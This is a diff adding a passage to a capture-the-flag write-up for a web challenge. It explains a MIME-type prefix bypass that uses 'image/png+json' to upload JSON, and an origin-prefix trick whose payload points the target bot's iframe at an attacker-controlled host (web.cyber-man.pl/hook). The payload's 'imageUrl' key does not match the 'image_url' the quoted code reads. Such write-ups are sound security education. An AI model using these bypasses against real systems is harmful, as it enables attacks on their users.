@@ -199,6 +199,41 @@ if (
 // ...
 ```
 
-That's unusual, because when we try to look for some common media types in [mozilla's developer docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types/Common_types), we can see, that a rather strict equality to `image/png` should be more suitable. That leads us to hunt if there are any mimetypes that starts with `image/png` but are a proper `json` instead.
+That's unusual, because when we try to look for some common media types in [mozilla's developer docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types/Common_types), we can see, that a rather strict equality to `image/png` should be more suitable. That leads us to hunt if there are any mimetypes that starts with `image/png` but are a proper `json` instead. So actually [`piskel`](https://www.piskelapp.com/p/create/sprite/) file format is all json inside, and is associated with `image/png+json` mimetype! Let's try that:
+
+![upload json](https://github.com/tomek7667/hacker-blog/raw/master/challs_media/web-dummyhole/upload-json.webp)
+
+It worked! Our `{}` file is now stored on the server and available under the id `1e6baaa6-...`. Now that we control the `postData` in `post.html`, we can take a look, what kind of powers it gives us.
+
+```html
+<div class="post-container">
+	<h1 id="title">Loading...</h1>
+	<div class="description" id="description"></div>
+	<iframe id="imageFrame" credentialless></iframe>
+</div>
+```
+
+```js
+const postData = await import(`/api/posts/${postId}`, {
+	with: { type: "json" },
+});
+
+document.getElementById("title").textContent = postData.default.title;
+document.getElementById("description").textContent =
+	postData.default.description;
+
+const imageUrl = `${location.origin}${postData.default.image_url}`;
+document.getElementById("imageFrame").src = imageUrl;
+```
+
+so we can essentially control the source of `credentialles` iframe provided that it starts with `location.origin` which in our target's _(bot)_ case, will be `http://web`. We can achieve that by either using [webhook.site](https://webhook.site/), or by having our own domain set up to have a `web` subdomain / prefix. As the body of the image, we then provide any title/description, and the imageUrl, with the cut-off `http://web` prefix:
+
+```json
+{
+	"title": "123",
+	"description": "456",
+	"imageUrl": ".cyber-man.pl/hook" // will become `http://web.cyber-man.pl/hook` from the bot's point of view.
+}
+```
 
 <!-- TODO: -->
